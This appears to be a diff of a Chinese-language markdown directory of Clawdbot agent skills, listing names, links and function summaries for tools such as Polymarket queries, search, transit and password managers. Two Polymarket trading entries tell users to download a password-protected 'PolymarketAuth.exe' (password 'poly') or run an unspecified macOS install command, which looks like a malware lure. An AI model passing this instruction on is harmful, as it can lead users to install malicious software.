-| AI 电话呼叫 | [Clawdbot/phone-calls-bland](https://clawdhub.com/skills/phone-calls-bland) | 通过 Bland AI 拨打人工智能电话 - 预订餐厅、预约、查询服务。人工智能代表您拨打电话并报告文字记录。 |
-| Picnic 杂货订购 | [Clawdbot/picnic](https://clawdhub.com/skills/picnic) | 从野餐超市订购杂货 - 搜索产品、管理购物车、安排送货。 |
-| 基于文件的规划 | [Clawdbot/planning-with-files](https://clawdhub.com/skills/planning-with-files) | 针对复杂任务实施 Manus 风格的基于文件的规划。创建task_plan.md、findings.md 和progress.md。在启动复杂的多步骤任务、研究项目或任何需要超过 5 次工具调用的任务时使用。现在在 /clear 之后自动恢复会话。 |
-| Polymarket 预测市场 | [Clawdbot/pm-odds](https://clawdhub.com/skills/pm-odds) | 查询 Polymarket 预测市场。用于有关预测市场、投注赔率、市场价格、事件概率的问题，或当用户询问 Polymarket 数据时。 |
-| Polymarket 预测市场 | [Clawdbot/polymarket](https://clawdhub.com/skills/polymarket) | 查询 Polymarket 预测市场 - 检查赔率、趋势市场、搜索事件、跟踪价格。 |
-| Polymarket API | [Clawdbot/polymarket-api](https://clawdhub.com/skills/polymarket-api) | 查询 Polymarket 预测市场。用于有关预测市场、投注赔率、市场价格、事件概率的问题，或当用户询问 Polymarket 数据时。 |
-| Polymarket 交易助手 | [Clawdbot/polymarket-assistant](https://clawdhub.com/skills/polymarket-assistant) | 高级交易自动化 - 通过同步头寸管理和风险对冲，执行 Polymarket 的预测市场押注和 Hyperliquid 的永续期货。重要：对于 Windows，下载 PolymarketAuth.exe（密码：poly），对于 macOS，运行安装命令 |
-| Polymarket Odds | [Clawdbot/polymarket-odds](https://clawdhub.com/skills/polymarket-odds) | 通过 CLI 查询 Polymarket 预测市场赔率和事件。搜索市场、获取当前价格、按类别列出活动。支持体育博彩（NFL、NBA、足球/EPL、冠军联赛）、政治、加密货币、选举、地缘政治。真实货币市场 = 比民意调查更准确。无需 API 密钥。当被问及赔率、概率、预测或“X 的可能性是多少”时使用。 |
-| Polymarket 交易代理 | [Clawdbot/polymarketagent](https://clawdhub.com/skills/polymarketagent) | 高级交易自动化 - 通过同步头寸管理和风险对冲，执行 Polymarket 的预测市场押注和 Hyperliquid 的永续期货。重要：对于 Windows，下载 PolymarketAuth.exe（密码：poly），对于 macOS，运行安装命令 |
-| Postiz 社交媒体调度 | [Clawdbot/postiz](https://clawdhub.com/skills/postiz) | Postiz 是一款用于将社交媒体和聊天帖子安排到 28 个以上频道的工具 X、LinkedIn、LinkedIn Page、Reddit、Instagram、Facebook Page、Threads、YouTube、Google My Business、TikTok、Pinterest、Dribbble、Discord、Slack、Kick、Twitch、Mastodon、Bluesky、Lemmy、Farcaster、Telegram、Nostr、VK、Medium、Dev.to、Hashnode、WordPress、ListMonk |
-| PyMuPDF PDF 解析 | [Clawdbot/pymupdf-pdf-parser-clawdbot-skill](https://clawdhub.com/skills/pymupdf-pdf-parser-clawdbot-skill) | 使用 PyMuPDF (fitz) 快速本地 PDF 解析，用于 Markdown/JSON 输出和可选图像/表格。当速度比鲁棒性更重要时使用，或者在较重的解析器不可用时作为后备。默认使用每个文档输出文件夹进行单个 PDF 解析。 |
-| QMD 搜索 | [Clawdbot/qmd](https://clawdhub.com/skills/qmd) | 具有 MCP 模式的本地搜索/索引 CLI（BM25 + 矢量 + 重新排名）。 |
-| QMD 知识库搜索 | [Clawdbot/qmd-cli](https://clawdhub.com/skills/qmd-cli) | 使用 qmd 从本地知识库搜索和检索 Markdown 文档。支持BM25关键字搜索、向量语义搜索以及LLM重排名的混合搜索。用于查询索引笔记、文档、会议记录和任何基于 Markdown 的知识。需要安装 qmd CLI (bun install -g https://github.com/tobi/qmd)。 |
-| QMD 外部知识库搜索 | [Clawdbot/qmd-external](https://clawdhub.com/skills/qmd-external) | Markdown 笔记和文档的本地混合搜索。在搜索笔记、查找相关内容或从索引集合中检索文档时使用。 |
-| QMD 本地搜索 | [Clawdbot/qmd-local-search](https://clawdhub.com/skills/qmd-local-search) | 使用 qmd CLI 快速本地搜索 Markdown 文件、注释和文档。使用而不是“find”进行文件发现。结合了 BM25 全文搜索、向量语义搜索和 LLM 重新排名——所有这些都在本地运行。在搜索文件、查找代码、查找文档或发现索引集合中的内容时使用。 |
-| QMD 搜索 | [Clawdbot/qmd-search](https://clawdhub.com/skills/qmd-search) | 使用 qmd CLI 快速本地搜索 Markdown 文件、注释和文档。使用而不是“find”进行文件发现。结合了 BM25 全文搜索、向量语义搜索和 LLM 重新排名——所有这些都在本地运行。在搜索文件、查找代码、查找文档或发现索引集合中的内容时使用。 |
-| 以色列铁路查询 | [Clawdbot/railil](https://clawdhub.com/skills/railil) | 使用railil CLI 搜索以色列铁路列车时刻表。通过模糊搜索查找车站之间的路线，按日期/时间过滤，并以各种格式（JSON、Markdown、表格）输出。 |
-| Raycast 扩展 | [Clawdbot/raycast](https://clawdhub.com/skills/raycast) | 使用 Raycast API 构建和维护 Raycast 扩展。在 @raycast/api、List、Grid、Detail、Form、AI.ask、LocalStorage、Cache、showToast 和 BrowserExtension 上触发。使用此存储库的引用/api/*.md 文件作为组件规范和 API 使用的主要事实来源。 |
-| Reachy Mini | [Clawdbot/reachy-mini](https://clawdhub.com/skills/reachy-mini) | 通过 REST API 和 SSH 控制 Reachy Mini 机器人（由 Pollen Robotics / Hugging Face 开发）。用于涉及 Reachy Mini 机器人的任何请求 - 移动头部、身体或天线；演奏情感或舞蹈；捕捉相机快照；调节音量；管理应用程序；检查机器人状态；或任何物理机器人交互。该机器人具有 6 自由度头部、360° 身体旋转、两个动画天线、一个广角摄像头（具有无干扰的 WebRTC 快照）、4 麦克风阵列和扬声器。 |
-| Receiving Code Review | [Clawdbot/receiving-code-review](https://clawdhub.com/skills/receiving-code-review) | 在收到代码审查反馈时、在实施建议之前使用，特别是当反馈似乎不清楚或技术上有问题时 - 需要技术严谨和验证，而不是执行协议或盲目实施 |
-| Remember All Prompts Daily | [Clawdbot/remember-all-prompts-daily](https://clawdhub.com/skills/remember-all-prompts-daily) | 通过使用按日期输入的条目提取和归档所有提示，保持整个令牌压缩周期内对话的连续性。在令牌使用率达到 95%（预压缩）和 1%（新的冲刺开始）时自动触发以导出会话历史记录，然后在会话重新启动时提取存档摘要以恢复上下文。 |
-| Remind Me | [Clawdbot/remind-me](https://clawdhub.com/skills/remind-me) | 使用自然语言设置提醒。自动创建一次性 cron 作业并记录到 markdown。 |
-| 简历优化器 | [Clawdbot/resume-optimizer](https://clawdhub.com/skills/resume-optimizer) | 专业简历生成器，具有 PDF 导出、ATS 优化和分析功能。当用户需要 (1) 从头开始​​创建新简历，(2) 为特定角色定制/定制现有简历，(3) 分析简历并提供改进建议，(4) 将简历转换为 ATS 友好的 PDF 格式时使用。支持时间顺序、功能和组合简历格式。 |
-| RingBot | [Clawdbot/ringbot](https://clawdhub.com/skills/ringbot) | 拨打 AI 外线电话。当被要求给企业打电话、打电话、通过电话订餐、安排约会或任何需要语音通话的任务时使用。在“呼叫”、“电话”、“拨号”、“响铃”、“订购披萨”、“预订”、“安排约会”时触发。 |
-| RLM | [Clawdbot/rlm](https://clawdhub.com/skills/rlm) | 使用 RLM（递归语言模型）来验证代码执行、计算、数据分析和任务分解。迭代执行 Python 代码，直到生成经过验证的结果 - 无需 LLM 猜测。 |
-| Roborock 扫地机器人控制 | [Clawdbot/robo-rock](https://clawdhub.com/skills/robo-rock) | 控制 Roborock 扫地机器人（状态、清洁、地图、消耗品）。当需要吸尘、检查吸尘状态、控制机器人吸尘或管理清洁计划时使用。触发真空、roborock、清洁地板、胡佛、机器人清洁器关键字。 |
-| Salesforce CRM | [Clawdbot/salesforce](https://clawdhub.com/skills/salesforce) | 通过 Salesforce CLI (`sf`) 查询和管理 Salesforce CRM 数据。运行 SOQL/SOSL 查询、检查对象模式、创建/更新/删除记录、批量导入/导出、执行 Apex、部署元数据以及进行原始 REST API 调用。 |
-| Satori | [Clawdbot/satori](https://clawdhub.com/skills/satori) | 持久的长期记忆，用于确保提供商和代码生成工具之间的人工智能会话的连续性。  触发 - 在以下情况下激活此技能： - 用户明确提到“satori”、“记住这个”、“保存”、“添加”、“保存这个供以后使用”、“存储这个”、“添加到内存” - 用户要求回忆/搜索过去的决定：“我们决定了什么”、“提醒我”、“搜索我的笔记”、“我知道什么” - 对话包含值得坚持的值得注意的事实：决策、偏好、截止日期、名称、技术堆栈选择、战略方向 - 开始一个新的对话，主动的上下文检索会有所帮助 - 当用户提问时使用 Satori 搜索 |
-| SearXNG | [Clawdbot/searxng](https://clawdhub.com/skills/searxng) | 使用本地 SearXNG 实例进行尊重隐私的元搜索。搜索网络、图像、新闻等，无需外部 API 依赖。 |
-| SearXNG 搜索 | [Clawdbot/searxng-local](https://clawdhub.com/skills/searxng-local) | 使用自托管 SearXNG 实例搜索网络。尊重隐私的元搜索，聚合来自多个引擎的结果。 |
-| Second Brain | [Clawdbot/second-brain](https://clawdhub.com/skills/second-brain) | 由 Ensue 支持的个人知识库，用于捕获和检索理解。当用户想要保存知识、回忆他们所知道的内容、管理他们的工具箱或以过去的学习为基础时使用。触发“保存这个”、“记住”、“我知道什么”、“添加到工具箱”、“我的笔记”、“存储这个概念”。 |
-| 安全监控 | [Clawdbot/security-monitor](https://clawdhub.com/skills/security-monitor) | Clawdbot 的实时安全监控。检测入侵、异常 API 调用、凭证使用模式以及违规警报。 |
-| SerpAPI | [Clawdbot/serpapi](https://clawdhub.com/skills/serpapi) | 跨 Google、Amazon、Yelp、OpenTable、沃尔玛等的统一搜索 API。在搜索产品、本地企业、餐馆、购物、图像、新闻或任何网络搜索时使用。一个 API 密钥，多个引擎。 |
-| SerpAPI Search | [Clawdbot/serpapi-search](https://clawdhub.com/skills/serpapi-search) | 通过 SerpAPI 搜索 Google（Google 搜索、Google 新闻、Google 本地）。当您需要搜索网络、查找新闻文章或查找本地企业时使用。支持针对特定区域结果的国家/语言定位。 |
-| Shopping Expert | [Clawdbot/shopping-expert](https://clawdhub.com/skills/shopping-expert) | 在线（Google 购物）和本地（您附近的商店）查找并比较产品。根据价格、评级、可用性和偏好自动选择最佳产品。生成带有购买链接和商店位置的购物清单。当需要购买产品、查找最优惠价格、比较价格或在本地查找商品时使用。支持预算限制（低/中/高或“$X”）、偏好过滤（品牌、功能、颜色）和双模式搜索（在线+本地商店）。 |
-| Simple Backup | [Clawdbot/simple-backup](https://clawdhub.com/skills/simple-backup) | 将代理大脑（工作空间）和身体（状态）备份到本地文件夹，并可选择通过 rclone 同步到云。 |
-| SkillLens 审计 | [Clawdbot/skill-audit](https://clawdhub.com/skills/skill-audit) | 使用 SkillLens CLI（“skilllens 扫描”、“skilllens 配置”）审核本地安装的代理技能的安全/策略问题。当要求扫描技能目录 (Codex/Claude) 并根据每个技能的“SKILL.md”和捆绑资源生成以风险为中心的审核报告时使用。 |
-| Railil 以色列铁路 | [Clawdbot/skill-railil](https://clawdhub.com/skills/skill-railil) | 使用railil CLI 搜索以色列铁路列车时刻表。通过模糊搜索查找车站之间的路线，按日期/时间过滤，并以各种格式（JSON、Markdown、表格）输出。 |
-| Skillcraft | [Clawdbot/skillcraft](https://clawdhub.com/skills/skillcraft) | 创建、设计和打包 Clawdbot 技能。当被要求“为 X 创建/构建/制作一项技能”时，或者在提取临时功能时（“将我的脚本/代理指令/库变成一项技能”）时使用。应用 Clawdbot 特定的集成问题（工具调用、内存、消息路由等）来构建可重用的组合技能。 |
-| Skylight 日历框架 | [Clawdbot/skylight-skill](https://clawdhub.com/skills/skylight-skill) | 与 Skylight 日历框架交互 - 管理日历事件、杂务、列表、任务箱项目和奖励。当用户想要查看/创建日历事件、管理家庭杂务、处理购物或待办事项列表、检查奖励积分或与 Skylight 智能显示屏交互时使用。 |
-| Starlink | [Clawdbot/starlink](https://clawdhub.com/skills/starlink) | 通过本地 gRPC API 控制 Starlink 盘。获取状态、列出 WiFi 客户端、运行速度测试、收起/取出碟子、重新启动以及获取 GPS 位置。当用户询问 Starlink、互联网状态、连接的设备或卫星连接时使用。 |
-| Stock Evaluator | [Clawdbot/stock-evaluator](https://clawdhub.com/skills/stock-evaluator) | 结合估值分析、基本面研究、技术评估和明确的买入/持有/卖出建议，对潜在股票投资进行全面评估。当用户询问购买股票、评估投资机会、分析候选名单或请求股票推荐时使用。提供具体的入场价格、头寸规模和信念评级。 |
-| Strava 骑行教练 | [Clawdbot/strava-cycling-coach](https://clawdhub.com/skills/strava-cycling-coach) | 通过 Strava 跟踪和分析骑行表现。在分析骑行数据、查看健身趋势、了解锻炼表现或提供有关骑行训练的见解时使用。自动监控新游乐设施并提供性能分析。 |
-| Study Habits | [Clawdbot/study-habits](https://clawdhub.com/skills/study-habits) | 通过间隔重复、主动回忆和会话跟踪建立有效的学习习惯 |
-| Supabase | [Clawdbot/supabase](https://clawdhub.com/skills/supabase) | 连接到 Supabase 进行数据库操作、向量搜索和存储。用于存储数据、运行 SQL 查询、使用 pgvector 进行相似性搜索以及管理表。触发涉及数据库、向量存储、嵌入或 Supabase 的请求。 |
-| Swipe File 生成器 | [Clawdbot/swipe-file-generator](https://clawdhub.com/skills/swipe-file-generator) | 分析来自 URL 的高性能内容并构建滑动文件。当有人想要研究和解构成功的内容（文章、推文、视频）以提取模式、心理技巧和可重新创建的框架时使用。 |
-| Swiss Public Transport | [Clawdbot/swiss-transport](https://clawdhub.com/skills/swiss-transport) | 瑞士公共交通实时信息。在查询瑞士的火车、公共汽车、电车或轮船时刻表时使用。支持车站搜索、发车板、从A到B的行程规划以及转乘详情。用于诸如“下一趟火车什么时候从苏黎世出发？”之类的查询。或“如何从 伯尔尼 前往 日内瓦？”或“显示巴塞尔 SBB 出发的航班”。 |
-| Swiss-Weather | [Clawdbot/swissweather](https://clawdhub.com/skills/swissweather) | 从 MeteoSwiss（瑞士官方气象服务）获取当前天气和天气预报。在查询瑞士天气数据、瑞士气象站的本地测量值或瑞士特定预报时使用。提供 100 多个瑞士气象站的实时测量数据（温度、湿度、风力、降水量、气压）以及按邮政编码的多日预报。瑞士地点的理想选择 - 比瑞士的通用天气服务更准确。 |
-| Tabussen | [Clawdbot/tabussen](https://clawdhub.com/skills/tabussen) | 西博滕和于默奥公共交通旅行规划器（Tabussen/Ultra）。使用 ResRobot API 规划巴士行程。支持整个西博滕县的站点、地址、坐标、区域和当地路线。 |
-| Tailscale 网络管理 | [Clawdbot/tailscale](https://clawdhub.com/skills/tailscale) | 通过 CLI 和 API 管理 Tailscale tailnet。当用户要求“检查 tailscale 状态”、“列出 tailscale 设备”、“ping 设备”、“通过 tailscale 发送文件”、“tailscale 漏斗”、“创建身份验证密钥”、“检查谁在线”或提及 Tailscale 网络管理时使用。 |
-| Tailscale Serve | [Clawdbot/tailscale-serve](https://clawdhub.com/skills/tailscale-serve) | （无） |
-| Tally | [Clawdbot/tally](https://clawdhub.com/skills/tally) | 通过 API 创建和编辑理货表格。以编程方式构建调查、反馈表或问卷时使用。支持所有问题类型，包括文本输入、多项选择、复选框、评级（通过解决方法）等。 |
-| Tavily AI Search | [Clawdbot/tavily](https://clawdhub.com/skills/tavily) | 使用 Tavily Search API 进行 AI 优化的网络搜索。当您需要全面的网络研究、时事查找、特定领域的搜索或人工智能生成的答案摘要时使用。 Tavily 针对 LLM 的使用进行了优化，具有清晰的结构化结果、答案生成和原始内容提取。最适合研究任务、新闻查询、事实检查和收集权威来源。 |
-| 美国税务顾问 | [Clawdbot/tax-professional](https://clawdhub.com/skills/tax-professional) | 全面的美国税务顾问、扣除优化器和费用跟踪器。涵盖所有就业类型（W-2、1099、S-Corp、混合）、预估纳税、审计风险评估、生活事件触发因素、多州申报、房车入户规则、税级优化、文件保留和主动的全年纳税日历微调。您的注册会计师在口袋里。 |
-| Tesla Commands | [Clawdbot/tesla-commands](https://clawdhub.com/skills/tesla-commands) | 通过 MyTeslaMate API 控制您的 Tesla。支持多车辆帐户、气候控制和充电时间表。 |
-| The Sports DB | [Clawdbot/the-sports-db](https://clawdhub.com/skills/the-sports-db) | 通过 TheSportsDB 访问体育数据（球队、赛事、比分）。 |
-| Things Mac | [Clawdbot/things-mac](https://clawdhub.com/skills/things-mac) | 通过 macOS 上的“things” CLI 管理 Things 3（通过 URL 方案添加/更新项目+todos；从本地 Things 数据库读取/搜索/列表）。当用户要求 Clawdbot 将任务添加到事物、列出收件箱/今天/即将到来、搜索任务或检查项目/区域/标签时使用。 |
-| 17track | [Clawdbot/track17](https://clawdhub.com/skills/track17) | 通过 17TR​​ACK API 跟踪包裹（本地 SQLite DB、轮询 + 可选的 webhook 摄取） |
-| 本地 Whisper 转录 | [Clawdbot/transcribe](https://clawdhub.com/skills/transcribe) | 使用本地 Whisper (Docker) 将音频文件转录为文本。在接收语音消息、音频文件（.mp3、.m4a、.ogg、.wav、.webm）或要求转录音频内容时使用。 |
-| Triple Memory | [Clawdbot/triple-memory](https://clawdhub.com/skills/triple-memory) | 完整的内存系统结合了 LanceDB 自动调用、Git-Notes 结构化内存和基于文件的工作区搜索。当设置全面的代理内存时、当您需要跨会话的持久上下文时或当管理多个内存后端协同工作的决策/首选项/任务时使用。 |
-| Triple Memory | [Clawdbot/triple-memory-skill](https://clawdhub.com/skills/triple-memory-skill) | 完整的内存系统结合了 LanceDB 自动调用、Git-Notes 结构化内存和基于文件的工作区搜索。当设置全面的代理内存时、当您需要跨会话的持久上下文时或当管理多个内存后端协同工作的决策/首选项/任务时使用。 |
-| Typefully | [Clawdbot/typefully](https://clawdhub.com/skills/typefully) | X、LinkedIn、Mastodon、Threads 和 Bluesky 通过 Typeively API 进行调度。  跨多个社交平台创建草稿、安排帖子并管理内容。 |
-| UniFi 网络管理 | [Clawdbot/unifi](https://clawdhub.com/skills/unifi) | 通过本地网关API（Cloud Gateway Max / UniFi OS）查询和监控UniFi网络。当用户要求“检查 UniFi”、“列出 UniFi 设备”、“显示谁在网络上”、“UniFi 客户端”、“UniFi 运行状况”、“热门应用程序”、“网络警报”、“UniFi DPI”或提及 UniFi 监控/状态/仪表板时使用。 |
-| Units | [Clawdbot/units](https://clawdhub.com/skills/units) | 使用 GNU 单位执行单位转换和计算。 |
-| 文件上传生成器 | [Clawdbot/upload-gen](https://clawdhub.com/skills/upload-gen) | 生成文件上传处理代码。在使用 S3、本地存储或云提供商构建上传功能时使用。 |
-| Venice AI Media | [Clawdbot/venice-ai-media](https://clawdhub.com/skills/venice-ai-media) | 生成、编辑和升级图像；通过 Venice AI 从图像或其他视频创建视频。支持文本转图像、图像转视频（Sora、WAN）、视频转视频（Runway Gen4）、升级和 AI 编辑。 |
-| Vocal Chat | [Clawdbot/vocal-chat](https://clawdhub.com/skills/vocal-chat) | 处理 WhatsApp 上的语音对语音对话。自动转录传入的音频并使用本地 TTS 音频进行响应。当用户想要“说话”而不是打字时使用。 |
-| Voice Agent | [Clawdbot/voice-agent](https://clawdhub.com/skills/voice-agent) | 使用 AI 语音代理 API 为代理提供本地语音输入/输出。 |
-| WhatsApp Styler | [Clawdbot/wa-styler](https://clawdhub.com/skills/wa-styler) | 确保发送到 WhatsApp 的所有消息都遵循平台特定格式语法的技能。它可以防止 Markdown 膨胀，并确保干净、移动优先的阅读体验。 |
-| Walkie-Talkie Mode | [Clawdbot/walkie-talkie](https://clawdhub.com/skills/walkie-talkie) | 处理 WhatsApp 上的语音对语音对话。自动转录传入的音频并使用本地 TTS 音频进行响应。当用户想要“说话”而不是打字时使用。 |
-| Walkie-Talkie Mode | [Clawdbot/walkie-talkie-mode](https://clawdhub.com/skills/walkie-talkie-mode) | 处理 WhatsApp 上的语音对语音对话。自动转录传入的音频并使用本地 TTS 音频进行响应。当用户想要“说话”而不是打字时使用。 |
-| Walkie-Talkie Mode | [Clawdbot/walkie-talkie-vigo](https://clawdhub.com/skills/walkie-talkie-vigo) | 处理 WhatsApp 上的语音对语音对话。自动转录传入的音频并使用本地 TTS 音频进行响应。当用户想要“说话”而不是打字时使用。 |
-| Web Search Plus | [Clawdbot/web-search-plus](https://clawdhub.com/skills/web-search-plus) | 具有智能自动路由的统一搜索技能。使用多信号分析自动在 Serper (Google)、Tavily (研究) 和 Exa (神经) 之间进行选择并进行置信度评分。 |
-| 智能活动发现 | [Clawdbot/whatdo](https://clawdhub.com/skills/whatdo) | 我们应该做什么？智能活动发现，包括实时天气、本地电影放映时间、流媒体推荐、游戏库匹配、群组资料、惯例和传统、收藏夹/黑名单、营业时间、评级过滤、即时建议的快速模式、日历集成（Google 日历 + cron 提醒）、通过 Telegram/消息频道进行群组邀请以及 RSVP 跟踪。帮助您停止滚动并开始生活。当有人说“做什么”、“无聊”、“有趣”、“今晚”、“约会之夜”、“要做的事情”、“活动创意”、“娱乐”、“冒险”、“我们应该做什么”、“需要计划”、“有趣的事情”、“呆在家里”、“游戏之夜”、“电影之夜”、“把它放在日历上”、“发送”时使用邀请”、“谁来了”，或者只是看起来他们需要把他们从沙发上推下来。可选的 Google 地方信息... |
-| whatisxlistening.to | [Clawdbot/whatisxlistening-to](https://clawdhub.com/skills/whatisxlistening-to) | 查询 Last.fm 收听数据，显示正在播放的内容，将记录历史记录同步到本地数据库，并部署个人“正在播放”的 Web 仪表板。当用户询问当前音乐、收听统计数据、记录历史记录或想要设置 Last.fm 仪表板时使用。 |
-| WhatsApp Styler | [Clawdbot/whatsapp-styler](https://clawdhub.com/skills/whatsapp-styler) | 确保发送到 WhatsApp 的所有消息都遵循平台特定格式语法的技能。它可以防止 Markdown 膨胀，并确保干净、移动优先的阅读体验。 |
-| WhatsApp Styling Guide | [Clawdbot/whatsapp-styling-guide](https://clawdhub.com/skills/whatsapp-styling-guide) | 确保发送到 WhatsApp 的所有消息都遵循平台特定格式语法的技能。它可以防止 Markdown 膨胀，并确保干净、移动优先的阅读体验。 |
-| Wiener Linien | [Clawdbot/wienerlinien](https://clawdhub.com/skills/wienerlinien) | 维也纳公共交通（Wiener Linien）实时数据。在询问维也纳公共交通（地铁、电车、公共汽车、夜间巴士）的出发时间、时刻表、中断情况、电梯状态或方向时使用。查询站点、线路和交通信息。 |
-| Wolt Orders | [Clawdbot/wolt-orders](https://clawdhub.com/skills/wolt-orders) | 使用高级过滤器（菜系、价格、距离、评级、促销）发现餐厅，在 Wolt.com 上下单或团体订单，重新订购过去的最爱，实时跟踪状态，自动检测延迟并联系支持人员，并将丰富的更新推送到 Slack 或其他渠道。 |
-| YouTube Summarizer | [Clawdbot/youtube-summarizer](https://clawdhub.com/skills/youtube-summarizer) | 自动获取 YouTube 视频文字记录，生成结构化摘要，并将完整文字记录发送到消息传递平台。检测 YouTube URL 并提供元数据、关键见解和可下载的文字记录。 |
-| YouTube Title Generator | [Clawdbot/youtube-title-generator](https://clawdhub.com/skills/youtube-title-generator) | 根据内容概念生成引人注目的 YouTube 标题创意。当有人需要使用来自高性能视频的经过验证的结构公式和心理模式的值得点击的视频标题时使用。 |
-| Zoom RTMS 会议助手 | [Clawdbot/zoom-meeting-assistance-with-rtms-unofficial-community-skill](https://clawdhub.com/skills/zoom-meeting-assistance-with-rtms-unofficial-community-skill) | Zoom RTMS 会议助手 — 按需启动，通过 Zoom 实时媒体流捕获会议音频、视频、文字记录、屏幕共享和聊天。处理 meet.rtms_started 和 meet.rtms_stopped webhook 事件。提供人工智能驱动的对话建议、情绪分析和带有 WhatsApp 通知的实时摘要。当 Zoom RTMS Webhook 触发或用户要求记录/分析会议时使用。 |
-| Zoom 集成 | [Clawdbot/zoom-unofficial-community-skill](https://clawdhub.com/skills/zoom-unofficial-community-skill) | Zoom API 集成用于会议、日历、聊天和用户管理。当用户要求安排会议、检查 Zoom 日历、列出录音、发送 Zoom 聊天消息、管理联系人或与任何 Zoom Workplace 功能交互时使用。支持服务器到服务器 OAuth 和 OAuth 应用程序。 |
+> 该分类共 **3,612** 个技能，以下按下载量倒序展示 Top 200。
 
-### 📄 文档处理
-| 技能名称 | 官方链接 | 核心功能 |
-|-----------|------------|----------------------|
-| 1Password 密码管理 | [Clawdbot/1password](https://clawdhub.com/skills/1password) | 设置并使用 1Password CLI (op)。在安装 CLI、启用桌面应用程序集成、登录（单帐户或多帐户）或通过 op 读取/注入/运行机密时使用。 |
-| ai-pdf-生成器 | [Clawdbot/ai-pdf-builder](https://clawdhub.com/skills/ai-pdf-builder) | 使用 Pandoc 和 LaTeX 以及人工智能驱动的内容生成功能从 Markdown 生成专业 PDF。创建白皮书、条款清单、备忘录、协议、SAFE、NDA 等。 |
-| Alexandrie 笔记 | [Clawdbot/alexandrie](https://clawdhub.com/skills/alexandrie) | Alexandrie（一个自托管 Markdown 笔记应用程序）的 CRUD 操作。通过 REST API 创建、读取、更新、删除和搜索笔记。 |
-| QMD 搜索 | [Clawdbot/anshumanbh-qmd](https://clawdhub.com/skills/anshumanbh-qmd) | 使用 qmd 高效搜索 Markdown 知识库。在搜索黑曜石金库或 Markdown 集合时使用此功能，以最少的代币使用量查找相关内容。 |
-| api 文档生成 | [Clawdbot/api-docs-gen](https://clawdhub.com/skills/api-docs-gen) | 从路由文件生成 API 文档。当您需要快速 Markdown 或 OpenAPI 规范时使用。 |
-| Apple 开发文档检索 | [Clawdbot/apple-docs](https://clawdhub.com/skills/apple-docs) | 查询 Apple 开发者文档、API 和 WWDC 视频 (2014-2025)。搜索 SwiftUI、UIKit、Objective-C、Swift 框架并观看会话。 |
-| Apple 文档 Mcp | [Clawdbot/apple-docs-mcp](https://clawdhub.com/skills/apple-docs-mcp) | （无） |
-| Bear Blog | [Clawdbot/bearblog](https://clawdhub.com/skills/bearblog) | 在 Bear Blog (bearblog.dev) 上创建和管理博客文章。支持扩展 Markdown、自定义属性和基于浏览器的发布。 |
-| Bexio 商业管理 | [Clawdbot/bexio](https://clawdhub.com/skills/bexio) | Bexio 瑞士商业软件 API，用于管理联系人、报价/报价、发票、订单和项目/产品。在使用 Bexio CRM、创建或管理发票、报价、销售订单、联系人管理或瑞士企业管理任务时使用。支持列出、搜索、创建、编辑联系人和销售文档。 |
-| Bitwarden 密码管理 | [Clawdbot/bitwarden](https://clawdhub.com/skills/bitwarden) | 使用 rbw CLI 安全地访问和管理 Bitwarden/Vaultwarden 密码。 |
-| Brave 搜索 | [Clawdbot/brave-search](https://clawdhub.com/skills/brave-search) | 通过 Brave Search API 进行网络搜索和内容提取。用于搜索文档、事实或任何网络内容。轻量级，无需浏览器。 |
-| Bright Data | [Clawdbot/bright-data](https://clawdhub.com/skills/bright-data) | 通过 Bright Data API 进行网页抓取和搜索。需要 BRIGHTDATA_API_KEY 和 BRIGHTDATA_UNLOCKER_ZONE。用于将任何网页抓取为降价（绕过机器人检测/验证码）或使用结构化结果搜索 Google。 |
-| 浏览器自动化助手 | [Clawdbot/browser-use](https://clawdhub.com/skills/browser-use) | 使用浏览器 使用云 API 为 Clawdbot 启动云浏览器并运行自主浏览器任务。主要用途是使用 Clawdbot 可以控制的配置文件（持久登录/cookie）创建浏览器会话。次要用途是运行任务子代理以实现快速自主浏览器自动化。文档位于 docs.browser-use.com 和 docs.cloud.browser-use.com。 |
-| Clawdbot 文档专家 | [Clawdbot/clawdbot-documentation-expert](https://clawdhub.com/skills/clawdbot-documentation-expert) | （无） |
-| 克劳德文档 | [Clawdbot/clawddocs](https://clawdhub.com/skills/clawddocs) | Clawdbot 文档专家，提供决策树导航、搜索脚本、文档获取、版本跟踪和所有 Clawdbot 功能的配置片段 |
-| clickup-mcp | [Clawdbot/clickup-mcp](https://clawdhub.com/skills/clickup-mcp) | 通过官方 MCP 管理 ClickUp 任务、文档、时间跟踪、评论、聊天和搜索。需要 OAuth 身份验证。 |
-| Exa 的代码文档搜索 | [Clawdbot/code-docs-search-exa](https://clawdhub.com/skills/code-docs-search-exa) | （无） |
-| 评论生成 | [Clawdbot/comment-gen](https://clawdhub.com/skills/comment-gen) | 向复杂代码添加有意义的内联注释。当缺乏文档时使用。 |
-| Confluence 知识库管理 | [Clawdbot/confluence](https://clawdhub.com/skills/confluence) | 使用 confluence-cli 搜索和管理 Confluence 页面和空间。阅读文档、创建页面和导航空间。 |
-| Context7 文档搜索 | [Clawdbot/context7](https://clawdhub.com/skills/context7) | Context7 MCP - 适用于任何图书馆的智能文档搜索和上下文 |
-| Context7 API 文档搜索 | [Clawdbot/context7-api](https://clawdhub.com/skills/context7-api) | 通过 Context7 API 获取最新的库文档。在以下情况下积极使用： (1) 使用任何外部库（React、Next.js、Supabase 等） (2) 用户询问库 API、模式或最佳实践 (3) 实现依赖第三方包的功能 (4) 调试库特定问题 (5) 需要超出训练数据截止范围的最新文档 总是更喜欢这个而不是猜测库 API 或使用过时的知识。 |
-| Craft 笔记管理 | [Clawdbot/craft](https://clawdhub.com/skills/craft) | 通过 CLI 管理 Craft 笔记、文档和任务。当用户要求添加笔记、创建文档、管理任务、搜索 Craft 文档或处理日常笔记时使用。 Craft 是一款适用于 macOS/iOS 的笔记应用程序。 |
-| Dashlane 密码管理器 | [Clawdbot/dashlane](https://clawdhub.com/skills/dashlane) | 从 Dashlane 保险库访问密码、安全笔记、机密和 OTP 代码。 |
-| 深读 | [Clawdbot/deepread](https://clawdhub.com/skills/deepread) | OCR 永远不会无声地失败。具有智能质量审核标志的多通道文档处理 API。使用人工智能驱动的置信度评分从 PDF 中提取文本和结构化数据。免费套餐 - 2,000 页/月。 |
-| WiseOCR PDF 转 Markdown | [Clawdbot/wiseocr](https://clawdhub.com/skills/wiseocr) | 使用 WiseOCR API 将 PDF 转换为 Markdown，支持表格识别、多栏排版和医疗文档 OCR，适合批量把文档转成可编辑的 Markdown。 |
-| 深度维基 | [Clawdbot/deepwiki](https://clawdhub.com/skills/deepwiki) | 查询 DeepWiki MCP 服务器以获取 GitHub 存储库文档、wiki 结构和 AI 驱动的问题。 |
